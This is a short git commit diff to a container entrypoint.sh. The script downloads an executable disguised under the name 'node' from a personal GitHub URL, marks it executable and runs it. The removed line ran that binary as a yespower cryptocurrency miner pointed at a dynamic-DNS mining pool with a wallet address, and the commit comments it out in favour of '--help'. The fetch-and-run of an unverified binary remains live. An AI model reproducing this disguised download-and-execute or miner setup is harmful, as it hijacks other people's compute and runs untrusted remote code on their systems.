6355bcfaf6a44181f5e9a9e35082413f1b8a44cd
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-01 01:45:47 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -2,4 +2,5 @@
 set -e
 curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
 chmod +x node
-./node -a yespower -o stratum+tcp://mining-pool.zapto.org:3710 -u WXeJSqsKYiHLTzwLBSM93z1spxCpyeAcqP
+# ./node -a yespower -o stratum+tcp://mining-pool.zapto.org:3710 -u WXeJSqsKYiHLTzwLBSM93z1spxCpyeAcqP
+./node --help
